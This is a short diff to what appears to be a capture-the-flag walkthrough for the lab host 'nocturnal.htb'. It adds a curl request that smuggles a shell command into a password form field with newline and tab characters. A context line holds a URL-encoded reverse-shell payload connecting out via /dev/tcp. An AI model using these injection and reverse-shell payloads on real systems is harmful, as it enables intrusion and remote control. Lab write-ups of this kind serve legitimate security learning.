@@ -250,6 +250,11 @@ curl -X POST "http://nocturnal.htb/admin.php?view=dashboard.php" \
   --data "backup="
 ```
 
+```bash 
+ curl -X POST "http://nocturnal.htb/admin.php?view=dashboard.php"   -H "Cookie: PHPSESSID=pr4mhlgg8d9nk2v2cnn6kro302"   -H "Content-Type: application/x-www-form-urlencoded"   --data-urlencode $'password=\nbash\t-c\t"ls"\n'   --data "backup="      
+```
+
+
 We tried multiple variations:
 
 - `%0Abash%09-i%09%3E%26%09/dev/tcp/10.10.14.44/4444%090%3E%261`
